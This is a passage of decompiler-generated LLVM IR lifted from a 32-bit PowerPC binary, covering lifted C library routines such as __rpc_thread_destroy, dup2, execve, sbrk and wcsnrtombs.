  %v4_10020934 = icmp eq i32 %v0_10020928, ptrtoint (i32* @global_var_1004da4c.1266 to i32)
  br i1 %v4_10020934, label %dec_label_pc_1002093c, label %dec_label_pc_10020944

dec_label_pc_1002093c:                            ; preds = %entry
  br label %dec_label_pc_10020944

dec_label_pc_10020944:                            ; preds = %entry, %dec_label_pc_1002093c
  %v0_10020950 = phi i32 [ %v0_10020928, %entry ], [ ptrtoint (i32* @global_var_1004ee58.1279 to i32), %dec_label_pc_1002093c ]
  ret i32 %v0_10020950

; uselistorder directives
  uselistorder label %dec_label_pc_10020944, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256), i32 0), label %dec_label_pc_10020984, label %dec_label_pc_10020978

dec_label_pc_10020978:                            ; preds = %entry
  %v2_10020978 = call i32 @__pthread_internal_tsd_get(i32 2, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256))
  br label %dec_label_pc_1002098c

dec_label_pc_10020984:                            ; preds = %entry
  %v3_10020988 = load i32, i32* @global_var_10045268.1268, align 4
  br label %dec_label_pc_1002098c

dec_label_pc_1002098c:                            ; preds = %dec_label_pc_10020978, %dec_label_pc_10020984
  %storemerge = phi i32 [ %v2_10020978, %dec_label_pc_10020978 ], [ %v3_10020988, %dec_label_pc_10020984 ]
  %v0_10020a1c2 = phi i32 [ %v2_10020978, %dec_label_pc_10020978 ], [ 2, %dec_label_pc_10020984 ]
  store i32 %storemerge, i32* @r31, align 4
  %v3_1002098c = icmp eq i32 %storemerge, 0
  %v4_10020998 = icmp eq i32 %storemerge, ptrtoint (i32* @global_var_1004da4c.1266 to i32)
  %brmerge = or i1 %v4_10020998, %v3_1002098c
  br i1 %brmerge, label %dec_label_pc_10020a0c, label %dec_label_pc_100209a4

dec_label_pc_100209a4:                            ; preds = %dec_label_pc_1002098c
  store i32 ptrtoint (i32* @global_var_100209a8.1280 to i32), i32* @lr, align 4
  %v1_100209a4 = call i32 @__rpc_thread_svc_cleanup(i32 ptrtoint (i32* @global_var_1004da4c.1266 to i32))
  store i32 268569004, i32* @lr, align 4
  %v1_100209a8 = call i32 @__rpc_thread_clnt_cleanup(i32 %v1_100209a4)
  %v0_100209ac = load i32, i32* @r31, align 4
  %v1_100209ac = add i32 %v0_100209ac, 152
  %v2_100209ac = inttoptr i32 %v1_100209ac to i32*
  %v3_100209ac = load i32, i32* %v2_100209ac, align 4
  store i32 %v3_100209ac, i32* @r3, align 4
  store i32 268569012, i32* @lr, align 4
  %v0_100209b0 = call i32 @free()
  %v0_100209b4 = load i32, i32* @r31, align 4
  %v1_100209b4 = add i32 %v0_100209b4, 156
  %v2_100209b4 = inttoptr i32 %v1_100209b4 to i32*
  %v3_100209b4 = load i32, i32* %v2_100209b4, align 4
  store i32 %v3_100209b4, i32* @r3, align 4
  store i32 268569020, i32* @lr, align 4
  %v0_100209b8 = call i32 @free()
  %v0_100209bc = load i32, i32* @r31, align 4
  %v1_100209bc = add i32 %v0_100209bc, 160
  %v2_100209bc = inttoptr i32 %v1_100209bc to i32*
  %v3_100209bc = load i32, i32* %v2_100209bc, align 4
  store i32 %v3_100209bc, i32* @r3, align 4
  store i32 268569028, i32* @lr, align 4
  %v0_100209c0 = call i32 @free()
  %v0_100209c4 = load i32, i32* @r31, align 4
  %v1_100209c4 = add i32 %v0_100209c4, 188
  %v2_100209c4 = inttoptr i32 %v1_100209c4 to i32*
  %v3_100209c4 = load i32, i32* %v2_100209c4, align 4
  store i32 %v3_100209c4, i32* @r3, align 4
  store i32 268569036, i32* @lr, align 4
  %v0_100209c8 = call i32 @free()
  %v0_100209cc = load i32, i32* @r31, align 4
  %v1_100209cc = add i32 %v0_100209cc, 172
  %v2_100209cc = inttoptr i32 %v1_100209cc to i32*
  %v3_100209cc = load i32, i32* %v2_100209cc, align 4
  store i32 %v3_100209cc, i32* @r3, align 4
  store i32 268569044, i32* @lr, align 4
  %v0_100209d0 = call i32 @free()
  %v0_100209d4 = load i32, i32* @r31, align 4
  %v1_100209d4 = add i32 %v0_100209d4, 176
  %v2_100209d4 = inttoptr i32 %v1_100209d4 to i32*
  %v3_100209d4 = load i32, i32* %v2_100209d4, align 4
  store i32 %v3_100209d4, i32* @r3, align 4
  store i32 268569052, i32* @lr, align 4
  %v0_100209d8 = call i32 @free()
  %v0_100209dc = load i32, i32* @r31, align 4
  store i32 %v0_100209dc, i32* @r3, align 4
  store i32 268569060, i32* @lr, align 4
  %v0_100209e0 = call i32 @free()
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32272), i32 0), label %dec_label_pc_10020a04, label %dec_label_pc_100209fc

dec_label_pc_100209fc:                            ; preds = %dec_label_pc_100209a4
  %v3_100209fc = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 ptrtoint (i32* @global_var_10010000.20 to i32))
  br label %dec_label_pc_10020a0c

dec_label_pc_10020a04:                            ; preds = %dec_label_pc_100209a4
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32272), i32* @global_var_10045268.1268, align 4
  br label %dec_label_pc_10020a0c

dec_label_pc_10020a0c:                            ; preds = %dec_label_pc_1002098c, %dec_label_pc_100209fc, %dec_label_pc_10020a04
  %v0_10020a1c = phi i32 [ %v0_10020a1c2, %dec_label_pc_1002098c ], [ %v3_100209fc, %dec_label_pc_100209fc ], [ 2, %dec_label_pc_10020a04 ]
  ret i32 %v0_10020a1c

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32272), i32 0), { 1, 2, 0 }
  uselistorder i32 188, { 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1004da4c.1266 to i32), { 1, 4, 5, 6, 0, 7, 8, 3, 2 }
  uselistorder i32 (i32, i32)* @__pthread_internal_tsd_get, { 0, 3, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 32256), { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10020a0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1002098c, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_10020a20 = load i32, i32* @lr, align 4
  %v0_10020a2c = load i32, i32* @r3, align 4
  store i32 %v0_10020a2c, i32* @r29, align 4
  %v0_10020a34 = call i32 @__errno_location()
  %v0_10020a38 = load i32, i32* @r29, align 4
  %v2_10020a38 = inttoptr i32 %v0_10020a34 to i32*
  store i32 %v0_10020a38, i32* %v2_10020a38, align 4
  store i32 %v0_10020a20, i32* @lr, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10020aac = add i32 %tmp, 84
  %v2_10020aac = inttoptr i32 %v1_10020aac to i32*
  %v3_10020aac = load i32, i32* %v2_10020aac, align 4
  %v1_10020ac8 = call %0 @__asm_mtcrf(i32 255, i32 %v3_10020aac)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10020b0c = load i32, i32* @lr, align 4
  %v1_10020b0c = load i1, i1* @cr0_so, align 1
  %v2_10020b0c = xor i1 %v1_10020b0c, true
  call void @__pseudo_cond_branch(i1 %v2_10020b0c, i32 %v0_10020b0c)
  %v0_10020b10 = call i32 @__syscall_error()
  ret i32 %v0_10020b10
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020b2c = call i32 @__asm_mfcr()
  %v1_10020b30 = and i32 %v0_10020b2c, 268435456
  %v3_10020b30 = icmp eq i32 %v1_10020b30, 0
  store i32 %v0_10020b2c, i32* %r31.global-to-local, align 4
  br i1 %v3_10020b30, label %dec_label_pc_10020b48, label %dec_label_pc_10020b3c

dec_label_pc_10020b3c:                            ; preds = %entry
  %v0_10020b3c = call i32 @__errno_location()
  %v0_10020b40 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020b40 = inttoptr i32 %v0_10020b3c to i32*
  store i32 %v0_10020b40, i32* %v2_10020b40, align 4
  br label %dec_label_pc_10020b48

dec_label_pc_10020b48:                            ; preds = %entry, %dec_label_pc_10020b3c
  %v0_10020b58 = phi i32 [ %v0_10020b2c, %entry ], [ -1, %dec_label_pc_10020b3c ]
  ret i32 %v0_10020b58

; uselistorder directives
  uselistorder label %dec_label_pc_10020b48, { 1, 0 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020b74 = call i32 @__asm_mfcr()
  %v1_10020b78 = and i32 %v0_10020b74, 268435456
  store i32 %v1_10020b78, i32* @r9, align 4
  %v3_10020b78 = icmp eq i32 %v1_10020b78, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10020b74, i32* %r31.global-to-local, align 4
  br i1 %v3_10020b78, label %dec_label_pc_10020b90, label %dec_label_pc_10020b84

dec_label_pc_10020b84:                            ; preds = %entry
  %v0_10020b84 = call i32 @__errno_location()
  %v0_10020b88 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020b88 = inttoptr i32 %v0_10020b84 to i32*
  store i32 %v0_10020b88, i32* %v2_10020b88, align 4
  br label %dec_label_pc_10020b90

dec_label_pc_10020b90:                            ; preds = %entry, %dec_label_pc_10020b84
  %v0_10020ba0 = phi i32 [ %v0_10020b74, %entry ], [ -1, %dec_label_pc_10020b84 ]
  ret i32 %v0_10020ba0

; uselistorder directives
  uselistorder i1* @cr0_so, { 7, 5, 6, 10, 11, 12, 4, 8, 9, 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10020b90, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020bbc = call i32 @__asm_mfcr()
  %v1_10020bc0 = and i32 %v0_10020bbc, 268435456
  %v3_10020bc0 = icmp eq i32 %v1_10020bc0, 0
  store i32 %v0_10020bbc, i32* %r31.global-to-local, align 4
  br i1 %v3_10020bc0, label %dec_label_pc_10020bd8, label %dec_label_pc_10020bcc

dec_label_pc_10020bcc:                            ; preds = %entry
  %v0_10020bcc = call i32 @__errno_location()
  %v0_10020bd0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020bd0 = inttoptr i32 %v0_10020bcc to i32*
  store i32 %v0_10020bd0, i32* %v2_10020bd0, align 4
  br label %dec_label_pc_10020bd8

dec_label_pc_10020bd8:                            ; preds = %entry, %dec_label_pc_10020bcc
  %v0_10020be8 = phi i32 [ %v0_10020bbc, %entry ], [ -1, %dec_label_pc_10020bcc ]
  ret i32 %v0_10020be8

; uselistorder directives
  uselistorder label %dec_label_pc_10020bd8, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020c04 = call i32 @__asm_mfcr()
  %v1_10020c08 = and i32 %v0_10020c04, 268435456
  %v3_10020c08 = icmp eq i32 %v1_10020c08, 0
  store i32 %v0_10020c04, i32* %r31.global-to-local, align 4
  br i1 %v3_10020c08, label %dec_label_pc_10020c20, label %dec_label_pc_10020c14

dec_label_pc_10020c14:                            ; preds = %entry
  %v0_10020c14 = call i32 @__errno_location()
  %v0_10020c18 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020c18 = inttoptr i32 %v0_10020c14 to i32*
  store i32 %v0_10020c18, i32* %v2_10020c18, align 4
  br label %dec_label_pc_10020c20

dec_label_pc_10020c20:                            ; preds = %entry, %dec_label_pc_10020c14
  %v0_10020c30 = phi i32 [ %v0_10020c04, %entry ], [ -1, %dec_label_pc_10020c14 ]
  ret i32 %v0_10020c30

; uselistorder directives
  uselistorder label %dec_label_pc_10020c20, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020c4c = call i32 @__asm_mfcr()
  %v1_10020c50 = and i32 %v0_10020c4c, 268435456
  %v3_10020c50 = icmp eq i32 %v1_10020c50, 0
  store i32 %v0_10020c4c, i32* %r31.global-to-local, align 4
  br i1 %v3_10020c50, label %dec_label_pc_10020c68, label %dec_label_pc_10020c5c

dec_label_pc_10020c5c:                            ; preds = %entry
  %v0_10020c5c = call i32 @__errno_location()
  %v0_10020c60 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020c60 = inttoptr i32 %v0_10020c5c to i32*
  store i32 %v0_10020c60, i32* %v2_10020c60, align 4
  br label %dec_label_pc_10020c68

dec_label_pc_10020c68:                            ; preds = %entry, %dec_label_pc_10020c5c
  %v0_10020c78 = phi i32 [ %v0_10020c4c, %entry ], [ -1, %dec_label_pc_10020c5c ]
  ret i32 %v0_10020c78

; uselistorder directives
  uselistorder label %dec_label_pc_10020c68, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020c94 = call i32 @__asm_mfcr()
  %v1_10020c98 = and i32 %v0_10020c94, 268435456
  %v3_10020c98 = icmp eq i32 %v1_10020c98, 0
  store i32 %v0_10020c94, i32* %r31.global-to-local, align 4
  br i1 %v3_10020c98, label %dec_label_pc_10020cb0, label %dec_label_pc_10020ca4

dec_label_pc_10020ca4:                            ; preds = %entry
  %v0_10020ca4 = call i32 @__errno_location()
  %v0_10020ca8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020ca8 = inttoptr i32 %v0_10020ca4 to i32*
  store i32 %v0_10020ca8, i32* %v2_10020ca8, align 4
  br label %dec_label_pc_10020cb0

dec_label_pc_10020cb0:                            ; preds = %entry, %dec_label_pc_10020ca4
  %v0_10020cc0 = phi i32 [ %v0_10020c94, %entry ], [ -1, %dec_label_pc_10020ca4 ]
  ret i32 %v0_10020cc0

; uselistorder directives
  uselistorder label %dec_label_pc_10020cb0, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020cdc = call i32 @__asm_mfcr()
  %v1_10020ce0 = and i32 %v0_10020cdc, 268435456
  %v3_10020ce0 = icmp eq i32 %v1_10020ce0, 0
  store i32 %v0_10020cdc, i32* %r31.global-to-local, align 4
  br i1 %v3_10020ce0, label %dec_label_pc_10020cf8, label %dec_label_pc_10020cec

dec_label_pc_10020cec:                            ; preds = %entry
  %v0_10020cec = call i32 @__errno_location()
  %v0_10020cf0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020cf0 = inttoptr i32 %v0_10020cec to i32*
  store i32 %v0_10020cf0, i32* %v2_10020cf0, align 4
  br label %dec_label_pc_10020cf8

dec_label_pc_10020cf8:                            ; preds = %entry, %dec_label_pc_10020cec
  %v0_10020d08 = phi i32 [ %v0_10020cdc, %entry ], [ -1, %dec_label_pc_10020cec ]
  ret i32 %v0_10020d08

; uselistorder directives
  uselistorder label %dec_label_pc_10020cf8, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020d24 = call i32 @__asm_mfcr()
  %v1_10020d28 = and i32 %v0_10020d24, 268435456
  %v3_10020d28 = icmp eq i32 %v1_10020d28, 0
  store i32 %v0_10020d24, i32* %r31.global-to-local, align 4
  br i1 %v3_10020d28, label %dec_label_pc_10020d40, label %dec_label_pc_10020d34

dec_label_pc_10020d34:                            ; preds = %entry
  %v0_10020d34 = call i32 @__errno_location()
  %v0_10020d38 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020d38 = inttoptr i32 %v0_10020d34 to i32*
  store i32 %v0_10020d38, i32* %v2_10020d38, align 4
  br label %dec_label_pc_10020d40

dec_label_pc_10020d40:                            ; preds = %entry, %dec_label_pc_10020d34
  %v0_10020d50 = phi i32 [ %v0_10020d24, %entry ], [ -1, %dec_label_pc_10020d34 ]
  ret i32 %v0_10020d50

; uselistorder directives
  uselistorder i32 268435456, { 39, 40, 41, 26, 18, 4, 38, 37, 44, 27, 31, 46, 47, 16, 22, 30, 42, 12, 14, 15, 11, 13, 28, 29, 23, 5, 49, 43, 10, 6, 7, 17, 9, 36, 48, 34, 24, 19, 33, 52, 8, 32, 35, 45, 50, 51, 53, 0, 20, 1, 21, 2, 3, 25 }
  uselistorder label %dec_label_pc_10020d40, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_10020d70 = load i32, i32* @global_var_100452ac.1282, align 4
  %v3_10020d74 = icmp eq i32 %v3_10020d70, 0
  br i1 %v3_10020d74, label %dec_label_pc_10020d7c, label %dec_label_pc_10020d88

dec_label_pc_10020d7c:                            ; preds = %entry
  store i32 268569984, i32* @lr, align 4
  %v1_10020d7c = call i32 @__GI_brk(i32 0)
  %v1_10020d80 = icmp slt i32 %v1_10020d7c, 0
  br i1 %v1_10020d80, label %dec_label_pc_10020da8, label %dec_label_pc_10020d7c.dec_label_pc_10020d88_crit_edge

dec_label_pc_10020d7c.dec_label_pc_10020d88_crit_edge: ; preds = %dec_label_pc_10020d7c
  %v0_10020d88.pre = load i32, i32* @r30, align 4
  %v3_10020d8c.pre = load i32, i32* @global_var_100452ac.1282, align 4
  br label %dec_label_pc_10020d88

dec_label_pc_10020d88:                            ; preds = %dec_label_pc_10020d7c.dec_label_pc_10020d88_crit_edge, %entry
  %v3_10020d8c = phi i32 [ %v3_10020d8c.pre, %dec_label_pc_10020d7c.dec_label_pc_10020d88_crit_edge ], [ %v3_10020d70, %entry ]
  %v1_10020d94 = phi i32 [ %v0_10020d88.pre, %dec_label_pc_10020d7c.dec_label_pc_10020d88_crit_edge ], [ %arg1, %entry ]
  %v3_10020d88 = icmp eq i32 %v1_10020d94, 0
  store i32 %v3_10020d8c, i32* @r31, align 4
  br i1 %v3_10020d88, label %dec_label_pc_10020dac, label %dec_label_pc_10020d9c

dec_label_pc_10020d9c:                            ; preds = %dec_label_pc_10020d88
  %v2_10020d94 = add i32 %v1_10020d94, %v3_10020d8c
  store i32 268570016, i32* @lr, align 4
  %v1_10020d9c = call i32 @__GI_brk(i32 %v2_10020d94)
  %tmp6 = icmp sgt i32 %v1_10020d9c, -1
  br i1 %tmp6, label %dec_label_pc_10020d9c.dec_label_pc_10020dac_crit_edge, label %dec_label_pc_10020da8

dec_label_pc_10020d9c.dec_label_pc_10020dac_crit_edge: ; preds = %dec_label_pc_10020d9c
  %v0_10020db0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10020dac

dec_label_pc_10020da8:                            ; preds = %dec_label_pc_10020d9c, %dec_label_pc_10020d7c
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_10020dac

dec_label_pc_10020dac:                            ; preds = %dec_label_pc_10020d9c.dec_label_pc_10020dac_crit_edge, %dec_label_pc_10020d88, %dec_label_pc_10020da8
  %v0_10020db0 = phi i32 [ %v0_10020db0.pre, %dec_label_pc_10020d9c.dec_label_pc_10020dac_crit_edge ], [ %v3_10020d8c, %dec_label_pc_10020d88 ], [ -1, %dec_label_pc_10020da8 ]
  ret i32 %v0_10020db0

; uselistorder directives
  uselistorder i32 %v3_10020d8c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_10020dac, { 2, 0, 1 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10020dc4 = add i32 %arg1, 128
  %v1_10020dc8 = mul i32 %arg1, 2
  %v2_10020dcc = icmp ugt i32 %v1_10020dc4, 383
  %v0_10020dd0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10020dcc, i32 %v0_10020dd0)
  %v3_10020dd8 = load i32, i32* bitcast (i32** @global_var_10045164.1186 to i32*), align 4
  %v2_10020ddc = add i32 %v1_10020dc8, %v3_10020dd8
  %v3_10020ddc = inttoptr i32 %v2_10020ddc to i16*
  %v4_10020ddc = load i16, i16* %v3_10020ddc, align 2
  %v5_10020ddc = sext i16 %v4_10020ddc to i32
  ret i32 %v5_10020ddc
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10045230.991 to i32)

; uselistorder directives
  uselistorder i32* @global_var_10045230.991, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10020df0 = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_10020e0c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10020e0c, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10020df0, label %dec_label_pc_10020e18, label %dec_label_pc_10020e20

dec_label_pc_10020e18:                            ; preds = %entry
  %v2_10020e18 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10020e18, i32* @r3, align 4
  br label %dec_label_pc_10020e20

dec_label_pc_10020e20:                            ; preds = %entry, %dec_label_pc_10020e18
  %v0_10020e24 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_10020e18 ]
  %v2_10020e20 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_10020e24, i32* %stack_var_-40, align 4
  store i32 %v2_10020e20, i32* %stack_var_-36, align 4
  store i32 268570160, i32* @lr, align 4
  %v0_10020e2c = call i32 @__GI_wcsnrtombs()
  %v3_10020e30 = icmp eq i32 %v0_10020e2c, 0
  br i1 %v3_10020e30, label %dec_label_pc_10020e38, label %dec_label_pc_10020e3c

dec_label_pc_10020e38:                            ; preds = %dec_label_pc_10020e20
  br label %dec_label_pc_10020e3c

dec_label_pc_10020e3c:                            ; preds = %dec_label_pc_10020e20, %dec_label_pc_10020e38
  %v0_10020e48 = phi i32 [ %v0_10020e2c, %dec_label_pc_10020e20 ], [ 1, %dec_label_pc_10020e38 ]
  ret i32 %v0_10020e48

; uselistorder directives
  uselistorder label %dec_label_pc_10020e3c, { 1, 0 }
  uselistorder label %dec_label_pc_10020e20, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_10020e50 = load i32, i32* @r5, align 4
  store i32 %v0_10020e50, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_10020e58 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_10020e58

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10020e5c = load i32, i32* @r3, align 4
  %v3_10020e5c = icmp eq i32 %v0_10020e5c, 0
  %v0_10020e60 = load i32, i32* @lr, align 4
  store i32 %v0_10020e60, i32* %r0.global-to-local, align 4
  br i1 %v3_10020e5c, label %dec_label_pc_10020e88, label %dec_label_pc_10020e70

dec_label_pc_10020e70:                            ; preds = %entry
  %v1_10020e70 = load i32, i32* @r4, align 4
  %v4_10020e70 = icmp eq i32 %v0_10020e5c, %v1_10020e70
  store i32 1, i32* @r10, align 4
  br i1 %v4_10020e70, label %dec_label_pc_10020e7c, label %dec_label_pc_10020eb4

dec_label_pc_10020e7c:                            ; preds = %dec_label_pc_10020e70
  %v2_10020e80 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10020e80, i32* @r3, align 4
  store i32 0, i32* @r10, align 4
  br label %dec_label_pc_10020eb4

dec_label_pc_10020e88:                            ; preds = %entry
  %v2_10020e8011 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10020e8011, i32* @r3, align 4
  store i32 0, i32* @r10, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10020eb4

dec_label_pc_10020e94:                            ; preds = %dec_label_pc_10020ef4.dec_label_pc_10020ed4_crit_edge, %dec_label_pc_10020ed4.preheader
  %v0_10020e94 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10020ea0 = inttoptr i32 %v0_10020e94 to i32*
  store i32 84, i32* %v2_10020ea0, align 4
  %v0_10020f18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10020f14

dec_label_pc_10020ea8:                            ; preds = %dec_label_pc_10020ee4
  store i32 0, i32* @r11, align 4
  %v0_10020f04.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10020f00

dec_label_pc_10020eb4:                            ; preds = %dec_label_pc_10020e7c, %dec_label_pc_10020e70, %dec_label_pc_10020e88
  %v2_10020ee47 = phi i32 [ %v2_10020e80, %dec_label_pc_10020e7c ], [ %v0_10020e5c, %dec_label_pc_10020e70 ], [ %v2_10020e8011, %dec_label_pc_10020e88 ]
  %v0_10020eb4 = load i32, i32* @r5, align 4
  %v1_10020eb4 = load i32, i32* @r6, align 4
  %v3_10020eb4 = icmp ugt i32 %v0_10020eb4, %v1_10020eb4
  br i1 %v3_10020eb4, label %dec_label_pc_10020ebc, label %dec_label_pc_10020ec0

dec_label_pc_10020ebc:                            ; preds = %dec_label_pc_10020eb4
  store i32 %v1_10020eb4, i32* @r5, align 4
  br label %dec_label_pc_10020ec0

dec_label_pc_10020ec0:                            ; preds = %dec_label_pc_10020eb4, %dec_label_pc_10020ebc
  %v0_10020ecc = phi i32 [ %v0_10020eb4, %dec_label_pc_10020eb4 ], [ %v1_10020eb4, %dec_label_pc_10020ebc ]
  %v1_10020ec0 = add i32 %v0_10020ecc, 1
  store i32 %v1_10020ec0, i32* %r0.global-to-local, align 4
  %v0_10020ec4 = load i32, i32* @r4, align 4
  %v1_10020ec4 = inttoptr i32 %v0_10020ec4 to i32*
  %v2_10020ec4 = load i32, i32* %v1_10020ec4, align 4
  store i32 %v2_10020ec4, i32* @r11, align 4
  store i32 %v0_10020ecc, i32* %r9.global-to-local, align 4
  store i32 %v0_10020ecc, i32* %ctr.global-to-local, align 4
  %v2_10020efc3 = icmp eq i32 %v0_10020ecc, 0
  br i1 %v2_10020efc3, label %dec_label_pc_10020f00, label %dec_label_pc_10020ed4.preheader

dec_label_pc_10020ed4.preheader:                  ; preds = %dec_label_pc_10020ec0
  %v1_10020ed416 = inttoptr i32 %v2_10020ec4 to i32*
  %v2_10020ed417 = load i32, i32* %v1_10020ed416, align 4
  store i32 %v2_10020ed417, i32* %r0.global-to-local, align 4
  %v1_10020ed818 = add i32 %v2_10020ec4, 4
  store i32 %v1_10020ed818, i32* @r11, align 4
  %v2_10020edc20 = icmp ugt i32 %v2_10020ed417, 127
  br i1 %v2_10020edc20, label %dec_label_pc_10020e94, label %dec_label_pc_10020ee4.lr.ph

dec_label_pc_10020ee4.lr.ph:                      ; preds = %dec_label_pc_10020ed4.preheader
  %extract.t = trunc i32 %v2_10020ed417 to i8
  br label %dec_label_pc_10020ee4

dec_label_pc_10020ee4:                            ; preds = %dec_label_pc_10020ee4.lr.ph, %dec_label_pc_10020ef4.dec_label_pc_10020ed4_crit_edge
  %v2_10020ed423.off0 = phi i8 [ %extract.t, %dec_label_pc_10020ee4.lr.ph ], [ %extract.t24, %dec_label_pc_10020ef4.dec_label_pc_10020ed4_crit_edge ]
  %v2_10020ee422 = phi i32 [ %v2_10020ee47, %dec_label_pc_10020ee4.lr.ph ], [ %v2_10020ef4, %dec_label_pc_10020ef4.dec_label_pc_10020ed4_crit_edge ]
  %v3_10020ee4 = inttoptr i32 %v2_10020ee422 to i8*
  store i8 %v2_10020ed423.off0, i8* %v3_10020ee4, align 1
  %v0_10020ee8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10020ee8 = urem i32 %v0_10020ee8, 256
  store i32 %v1_10020ee8, i32* %r0.global-to-local, align 4
  %v3_10020eec = icmp eq i32 %v1_10020ee8, 0
  br i1 %v3_10020eec, label %dec_label_pc_10020ea8, label %dec_label_pc_10020ef4

dec_label_pc_10020ef4:                            ; preds = %dec_label_pc_10020ee4
  %v0_10020ef4 = load i32, i32* @r3, align 4
  %v1_10020ef4 = load i32, i32* @r10, align 4
  %v2_10020ef4 = add i32 %v1_10020ef4, %v0_10020ef4
  store i32 %v2_10020ef4, i32* @r3, align 4
  %v0_10020ef8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10020ef8 = add i32 %v0_10020ef8, -1
  store i32 %v1_10020ef8, i32* %r9.global-to-local, align 4
  %v0_10020efc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10020efc = add i32 %v0_10020efc, -1
  store i32 %v1_10020efc, i32* %ctr.global-to-local, align 4
  %v2_10020efc = icmp eq i32 %v1_10020efc, 0
  br i1 %v2_10020efc, label %dec_label_pc_10020f00, label %dec_label_pc_10020ef4.dec_label_pc_10020ed4_crit_edge

dec_label_pc_10020ef4.dec_label_pc_10020ed4_crit_edge: ; preds = %dec_label_pc_10020ef4
  %v0_10020ed4.pre = load i32, i32* @r11, align 4
  %v1_10020ed4 = inttoptr i32 %v0_10020ed4.pre to i32*
  %v2_10020ed4 = load i32, i32* %v1_10020ed4, align 4
  store i32 %v2_10020ed4, i32* %r0.global-to-local, align 4
